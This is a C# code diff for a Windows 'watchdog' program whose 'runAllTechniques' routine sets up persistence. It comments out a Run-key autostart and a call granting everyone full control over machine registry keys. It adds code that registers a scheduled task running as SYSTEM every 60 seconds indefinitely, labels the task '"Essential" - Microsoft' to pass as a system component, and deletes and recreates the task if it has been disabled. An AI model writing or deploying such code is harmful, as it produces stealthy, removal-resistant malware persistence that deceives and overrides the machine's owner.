@@ -2,6 +2,7 @@ using System.Diagnostics;
 using Microsoft.Win32;
 using System.Security.AccessControl;
 using System.Security.Principal;
+using Microsoft.Win32.TaskScheduler;
 using System.IO;
 
 
@@ -11,9 +12,9 @@ using System.IO;
 
         public static void runAllTechniques()
         {
-            GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys
+            //GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys
    
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
           
 
 
@@ -22,7 +23,7 @@ using System.IO;
             if (!TaskExistsAndActive(Config.ScheduledTaskName))
             {
                 // Create or re-enable the task if it doesn't exist or is inactive
-                CreateScheduledTask(Config.ScheduledTaskName, Config.PrimaryWatchdogFullPath, 3); // Runs every 3 minutes
+                CreateScheduledTask(Config.ScheduledTaskName, Config.PrimaryWatchdogFullPath); // Runs every minute
                 watchdogHelper.Log($"Scheduled task '{Config.ScheduledTaskName}' created or re-enabled successfully.");
             }
             else
@@ -33,53 +34,65 @@ using System.IO;
 
         }
 
-        private static bool TaskExistsAndActive(string taskName)
-        {
+    private static bool TaskExistsAndActive(string taskName)
+    {
         try
         {
-            Process process = new Process();
-            process.StartInfo.FileName = "schtasks";
-            process.StartInfo.Arguments = $"/Query /TN \"{taskName}\" /V /FO LIST";
-            process.StartInfo.RedirectStandardOutput = true;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.CreateNoWindow = true;
-
-            process.Start();
-            string output = process.StandardOutput.ReadToEnd();
-            process.WaitForExit();
-
-            // Check if the task exists and is active
-            return output.Contains(taskName) && output.Contains("Status: Ready");
+            using (TaskService ts = new TaskService())
+            {
+                Microsoft.Win32.TaskScheduler.Task? task = ts.GetTask(taskName);
+                if (task != null && task.State == TaskState.Ready)
+                {
+                    return true;
+                }
+                else
+                {
+                    ts.RootFolder.DeleteTask(taskName); // delete disabled task if it exists
+                    return false;
+                }
+            }
         }
-        catch (Exception ex) { 
+        catch (Exception ex)
+        {
             watchdogHelper.Log($"Error verifying task exists and active: {ex.Message}");
             return false;
         }
-        }
+    }
 
-        // Function to create a scheduled task to run every 30 seconds
-        private static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
+        private static void CreateScheduledTask(string taskName, string binaryPath)
         {
         try
         {
-            // Create the schtasks command to run every 30 seconds
-            string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds} /DU 9999:59 /RU SYSTEM"; //sets system permissions
+            using (TaskService ts = new TaskService())
+            {
+                TaskDefinition td = ts.NewTask();
+                td.RegistrationInfo.Description = "\"Essential\" - Microsoft";
+                td.Principal.LogonType = TaskLogonType.ServiceAccount;
+                td.Principal.UserId = "SYSTEM";
 
-            Process process = new Process();
-            process.StartInfo.FileName = "schtasks";
-            process.StartInfo.Arguments = command;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.CreateNoWindow = true;
+                // Set the trigger to run every 60 seconds
+                TimeTrigger trigger = new TimeTrigger
+                {
+                    StartBoundary = DateTime.Now,
+                    Repetition = new RepetitionPattern(TimeSpan.FromSeconds(60), TimeSpan.Zero) // Duration set to zero for indefinite repetition
+                };
+                td.Triggers.Add(trigger);
 
-            process.Start();
-            process.WaitForExit();
+                // Set the action to run the binary
+                td.Actions.Add(new ExecAction(binaryPath));
+
+                // Register the task
+                ts.RootFolder.RegisterTaskDefinition(taskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);
+            }
         }
-        catch (Exception ex) {
+        catch (Exception ex)
+        {
             watchdogHelper.Log($"Error creating scheduled task: {ex.Message}");
         }
-        }
+    }
 
-        private static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
+
+    private static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
         {
             try
             {
